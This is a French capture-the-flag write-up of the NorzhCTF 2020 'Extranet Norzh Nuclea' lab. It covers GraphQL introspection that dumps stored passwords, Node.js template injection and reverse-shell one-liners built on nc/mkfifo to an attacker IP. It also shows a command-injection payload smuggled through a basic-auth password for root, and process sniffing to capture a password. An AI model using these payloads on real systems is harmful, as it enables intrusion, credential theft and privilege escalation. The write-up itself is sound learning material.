# Norzh CTF 2020 - Extranet Norzh Nuclea



En janvier 2020, en marge du FIC, était organisé le NorzhCTF par l'ENSIBS. Cette année je ne faisais pas partie des "créateurs de challenges" mais bien des participants avec mes amis [Haax](https://twitter.com/Haaxmax), [Razaborg](https://twitter.com/razaborg) et [L0n3w0lf](https://twitter.com/AzrakelK).

Durant ce CTF, je me suis tout particulièrement occupé d'un scénario : __Extranet Norzh Nuclea__ que vous pouvez retrouver sur [le git du NorzhCTF](https://gitlab.com/norzhctf/norzhctf-2020).

# Énoncé

On commence par lire l'énoncé

> Vous avez trouvé l'extranet de l'entreprise.
>
> Ce challenge se décompose en 4 parties :
>
> - Obtenir un accés à l'interface administrateur
> - Obtenir un shell sur la machine
> - Obtenir un accès root sur la machine
> - Obtenir le mot de passe de l'utilisateur `web-dev`

Globalement, ça ressemble à de l'exploitation web puis une privesc système Linux... C'est tout à fait ce que je sais faire, donc on va se lancer.



# Obtenir l'accès administrateur

Dans un premier temps on va un peu fouiller le site. On a 3 pages :

- Une page d'accueil
- Une page de blog
- Une page de login

La page d'accueil ne me semble pas utile, je vais directement voir la page de blog. 

![Page de blog](/img/Nuclea_blog.png)

Ici, ça commence à devenir interéssant. Lorsque l'on regarde les liens des _blogposts_ on obtient quelque chose comme ceci :

> http://www.norzh.nuclea/blog/2f6772617068716c3f[...]6222297b5f6964207469746c6520636f6e74656e747d7d

Ça me paraît être quelque chose "encodé" en hexadécimal... On ouvre donc la console python, et on se fait une petite fonction pour décoder.

```python
def decode_hex(hex):
    return ''.join([chr(int(hex[i:i+2],16)) for i in range(0,len(hex),2)])

print(decode_hex("2f6772617068716c3f71756572793d7175657279207b626c6f67706f7374285f69643a2235646632363961323338356538393838356265636234356222297b5f6964207469746c6520636f6e74656e747d7d"))
```

Et on obtient le résultat suivant :

> /graphql?query=query {blogpost(_id:"5df269a2385e89885becb45b"){_id title content}}

C'est donc une requête GraphL, on peut le comprendre avec le _/graphql_ et au contenu de _query_. La requête est sans doute interprétée par le serveur pour nous obtenir le blogpost voulu... On doit pouvoir faire une injection là dessus.

## Trouver la table

Je me suis donc un peu renseigné sur le sujet n'en ayant jamais fait et je trouve rapidement ce qu'il faut faire.

Dans un premier temps, je me refait une petite fonction pour encoder toutes mes requêtes.

```python
from base64 import b16encode
def encode_hex(str):
    return b16encode(b'/graphql?query=query '+str.encode()).decode() #encode() et decode() pour gérer les byte-strings
```

La première étape pour obtenir le contenu de la base de données, c'est d'avoir toutes les tables présentes. En GrapQL ça s'obtient avec la requête

```graphql
{ __schema { types { name } } }
```

On va encoder tout ça et le mettre dans notre URL.

> http://www.norzh.nuclea/blog/2F6772617068716C3F7175657279[...]D61207B207479706573207B206E616D65207D207D207D

Et là on a un blogpost vide...

![BlogPost vide](/img/Nuclea_post_vide.png)

Pas d'inquiétude à avoir, en fait l'affichage est traité en js et le retour de notre requête n'est pas celui attendu. Donc on a juste à ouvrir les sources de la page.

![Source du blogpost](/img/Nuclea_injection_viewsource.jpg)

On voit bien la table __BlogPost__ qui sert à la requête de base, mais nous on va s'intéresser à la ble __User__.

Nos requêtes sont les suivantes :

## Trouver les colonnes

```GraphQL
{ __type(name: "User") { name fields { name type { name kind } } } }
```

Ici on récupère en plus les types de chaques colonnes

```GraphQL
{"__type":
	{ 
	"name":"User",
	"fields":
		[
			{
			"name":"_id",
			"type":
				{
				"name":"String",
				"kind":"SCALAR"
				}
			},
			{
			"name":"username",
			"type":
				{
				"name":"String",
				"kind":"SCALAR"
				}
			},
			{
			"name":"password",
			"type":
				{
				"name":"String",
				"kind":"SCALAR"
				}
			}
		]
	}
}
```

En résumé, nous avons 3 colonnes:

- _id
- username
- password

On veut, pour avancer, récupérer ces deux dernières.

## Récupérer les valeurs

On peut procéder de 2 manières :

- En requêtant toutes les valeurs de User une à une grâce à l'id
- En requêtant l'ensemble des valeurs de la table User.

Étant un partisan du moindre effort, je choisis la seconde option. Et pour ce faire, il "suffit" de rajouter un __s__ à la fin du nom de table.

```GraphQL
{ users { username, password } }
```

On obtient bien la liste de tous les couples _username_/_password_

```GraphQL
{"users": [
	{
		"username":"michelle",
		"password":"Michelle1234&__"
	},
	{
		"username":"bernard",
		"password":"youki1963"
	},
	{
		"username":"administrateur",
		"password":"ENSIBS{WOW_Such_Big_Credentials}"
	}
]}
```

On a donc notre premier flag, et de quoi se connecter avec le compte administrateur.

# Obtenir un shell

Une fois connecté, on ne me laisse pas trop le choix... On a juste une page pour créer des blogpost.

![Page pour créer les blogpost](/img/Nuclea_connected.png)

Ils sont gentils, ils m'indiquent tout de suite où regarder : Une "Server Side Template Injection".

Je teste comme ils disent le fameux __{7*7}__ et en allant voir dans les blogpost, je vois bien mon post avec en contenu __49__.

Pour être honnête, je ne connais que les injections de template via jinja, mon premier reflexe est donc de tenter une injection de code python.

```python
{{ [].__class__.__mro__[1].__subclasses__()[92].__init__.__globals__['sys'].modules['os'].popen("id -a").read().encode() }}
```

Mais étrangement le bouton ajouter ne fonctionne pas...

Dans un premier temps j'ai pensé à un genre de WAF qui bloquerait des mots-clefs, puis j'ai décidé de regarder le code source de la page. On pouvait y voir un code javascript qui gère l'envoi de la requête et l'affichage de sa réponse.

```javascript
$(document).ready(function(){
        $('#submit').click(function(e){
          e.preventDefault()

          var settings = {
            "async": true,
            "url": "/admin",
            "method": "POST",
            "headers": {
              "content-type": "application/json"
            },
            "processData": false,
            "data": JSON.stringify({
              title:$('#title').val(),
              content:$('#content').val()
            })
          }

          // Send data
          $.ajax(settings).done(function (response) {
            if(response === true){
              alert('Succesfully added blogpost')             
              $('#title').val('')
              $('#content').val('')
            } else {
              alert('Something went bad ...')
            }
          })
        
      })
    })
```

Étrangement, on ne rentrait même pas dans le _else_ du test après l'envoi de la requête. C'était donc une erreur non prévue par le serveur... L'injection de template n'était donc probablement pas en python.

On essaie d'injecter des mots clefs de langages, comme du node.js.

En envoyant un __{ this }__, le blogpost se créé, on va donc voir son contenu.

![Blogpost avec injection](/img/Nuclea_injected_post.png)

Bingo, c'est du node.js !

Je sais qu'on peut exécuter des commandes système avec le code suivant.

```javascript
{ require('child_process').exec('<CMD>') }
```

Mais à chaque fois j'obtient le résultat __[object Object]__. 

J'arrête donc d'essayer d'afficher et je lance un reverse shell. Sur ma machine j'ouvre un listener.

 ```bash
nc -nlvp 51337
 ```

Et je test une première payload sur le serveur.

```javascript
{ require('child_process').exec('nc -e /bin/sh <IP> <PORT>')) }
```

Malheureusement, ça ne fonctionne pas. Il n'y a probablement pas la bonne version de netcat pour ça. Mais pas d'inquiétude, on utilise une autre payload qui fonctionne à (presque) tous les coups :

```javascript
{ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f')) }
```

Et on obtient bien un accès sur notre listener.

Je fais ensuite en sorte d'avoir un shell totalement interactif.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'

	<Ctrl+Z>

stty -a | head -n1 #Je lis les valeurs rows & columns
stty raw -echo
fg #Il faut faire plusieures fois entrée
stty rows X columns Y #Avec X et Y les valeurs lues plus haut
export TERM=xterm-256color
```

Puis on va lire le flag

```bash
cd 
cat flag
	ENSIBS{Web-ServerUserFlagHereBroooo}
```

Parfait, passons à l'étape 3.

# Obtenir un shell root

Déjà, le premier reflexe est de voir ce qu'on peut executer avec sudo.

![Retour de sudo -l](/img/Nuclea_sudo.jpg)

Le sudo nous permet de lancer un serveur node.js en tant que root. En regardant les processus, on voit que ce serveur tourne déjà. On va dans un premier temps regarder le code de ce dernier.

```javascript
const express = require('express')
const  express_basic_auth = require('express-basic-auth')
const { spawn } = require('child_process')

const config = {
    PORT : 3000
}

const check_credentials = (user,password) => {
    const process = spawn('/bin/bash',['/healthcheck/authent.sh', user, password ])
    console.log(String(process.stdout))
    return String(process.stdout) == 'True'
}

const basic_auth = express_basic_auth({
    authorizer : check_credentials,
    unauthorizedResponse: (req) => {
        return req.auth
        ? ('Credentials ' + req.auth.user + ':' + "**********" + ' rejected')
        : 'No credentials provided'
    }
})

const app = express()
app.use(basic_auth)


app.get('/ping', (req, res) => {
    return res.send("up")
})

app.get('/health', (req, res) => {
    return res.send(String(spawn('/bin/ps',['-auxfw']).stdout))
})

app.get('/disk-usage', (req, res) => {
    return res.send(String(spawn('/bin/df',['-h']).stdout))
})

app.get('/web-logs', (req, res) => {
    return res.send(String(spawn('/bin/cat',['/var/log/httpd/error_log']).stdout))
})

app.get('/active-connections', (req,res) => {
    return res.send(String(spawn('/bin/netstat',['-laputen']).stdout))
})

app.listen(config.PORT, () =>
  console.log(`Healthcheck app listening on port ${config.PORT}!`),
);
```

Il s'agit d'un healthcheck sur le port 3000 avec authentification via basic-auth. On n'a pas les droits pour modifier ces fichiers donc la seule piste actuelle serait d'effectuer une injection via ce que fait le serveur.

En s'intéressant un peu plus à la fonction **check_credentials**, on voit qu'il appelle un script shell avec en argument le couple login/password avec lequel on veut s'authentifier. On va donc regarder ça de plus près.

```bash
#!/bin/sh

PATH=/bin:/usr/bin

username=$1
PASSWORD=$2

IFS=''

shadow_line=$(cat /etc/shadow | grep $1)
python3 -c "import crypt;salt='$shadow_line'.split('\$6\$')[1].split('$')[0];hash = crypt.crypt('$PASSWORD', '\$6\$'+salt+'$');print(hash == '$shadow_line'.split(':')[1],end='')"
```

On se retrouve donc face à un script plutôt... Sale. Mais intéréssant !

En effet, le script va :

- Récupérer notre couple username / password et les mettre dans des variables
- Extraire dans le fichier shadow le hash du mot de passe de l'utilisateur
- Lancer du python en ligne de commande qui va hasher notre mot de passe et comparer son hash avec celui récupéré

Les variables étant passées en ligne de commande pour le python, s'il y a des quotes elles seront interprétées. On a donc ici notre injection sur la variable __$PASSWORD__. Il faudra :

- Ouvrir une quote
- Compléter la fonction _crypt.crypt()_ pour éviter une erreur
- Ajouter le code que l'on veut executer
- Commenter le reste du code python

On se trouve avec une payload comme suit :

```
','');import os;os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f')#
```

Et pour faire ma requête, afin de ne pas m'embêter avec le basic-auth, je vais utiliser python-requests.

J'ouvre donc un listener :

```bash
nc -nlvp 51338
```



```python
import requests
r = requests.get("http://localhost:3000/ping", 
                 data={}, 
                 auth=("root","','');import os;os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f')#")
                )
```

Malheureusement, cette première requête n'a pas fonctionné... Je fais donc d'autre test en remplaçant le user __root__ par __web-dev__

```python
import requests
r = requests.get("http://localhost:3000/ping",
                 data={},
                 auth=("web-dev","','');import os;os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.17.0.1 51338 >/tmp/f')#")
                )
```

Et on obtient bien un shell root. On repète notre petite liste de commandes pour obtenir notre shell interactif puis on va lire le flag.

```bash
$ cd 
$ cat flag
ENSIBS{JesappelleRoot}
```

Et de 3 challs validés !

On peut d'ailleurs voir pourquoi la commande ne fonctionnait pas avec l'utilisateur root : On est dans un docker et le root n'a pas de mot de passe.

![/etc/shadow, ligne du root](/img/Nuclea_shadow_root.png)

Le script s'arrêtait donc sûrement avant l'execution du python.

# Trouver le mot de passe de web-dev

Ici, on se trouve face à un cas un peu spécifique... En général on trouve le mot de passe d'un utilisateur puis on s'en sert pour se connecter. Là le but final est de trouver ce mot de passe.

Le mot de passe étant le flag (probablement), casser le hash de _/etc/shadow_ serait impossible puisqu'il ne sera pas dans une wordlist.

La première idée qui me vient serait donc de vérifier dans tous les fichiers de configuration si la mention __ENSIBS__ apparaît quelque part. Pour cela, rien de plus simple qu'un grep.

```bash
$ cd /
$ grep -lR 'ENSIBS{'
```

Mais après discussion avec le créateur du challenge, c'est inutile. Le flag n'est pas simplement caché sur le serveur.

Je vois donc 2 possibilités :

- Le flag est chiffré quelque part
- Le flag est à l'exterieur du serveur

Au bout de 5min de réflexion intense, j'ai l'illumination : Le serveur sur le port 3000 est un serveur de "healthcheck" c'est à dire que les utilisateurs vont se connecter assez régulièrement vérifier qu'il est encore en vie et que tout fonctionne comme il faut.

Donc l'utilisateur web-dev fera sûrement des requêtes où il va s'authentifier, et son mot de passe apparaîtra dans les processus en argument de authent.sh ou dans la ligne de commande python.

Je récupère donc un outil magique : [__pspy__](https://github.com/DominicBreuker/pspy), un executable qui affiche les processus en temps réel avec leurs arguments.

Je le lance et je vois très vite le saint graal.

![Mot de passe de web-dev](/img/Nuclea_get_password.png)

Son mot de passe est donc le quatrième flag

> ENSIBS{I_kn0w_Ur_passWord_Web_dev} 

# Retour sur le scénario

J'ai trouvé ce scénario très intéréssant, il m'a fait travailler sur des technos sur lesquelles je ne tape pas souvent (voire jamais) comme GraphQL ou node.js. Je me suis donc bien amusé et il a pu nous rapporter un total de 1000 points (250 par challenge), ce qui n'est pas negligeable.

Cependant les parties 2 & 3 étaient quelque chose de "custom" de façon un peu trop flagrante ce qui peut un peu enlever au réalisme voulu par le CTF.

Malgré tout, bravo aux organisateurs et particulièrement à [Areizen](https://twitter.com/Areizen_) pour ce scénario.




---

> Auteur: [Driikolu](https://x.com/driikolu)  
> URL: https://driikolu.fr/posts/nuclea-web-extranet/  

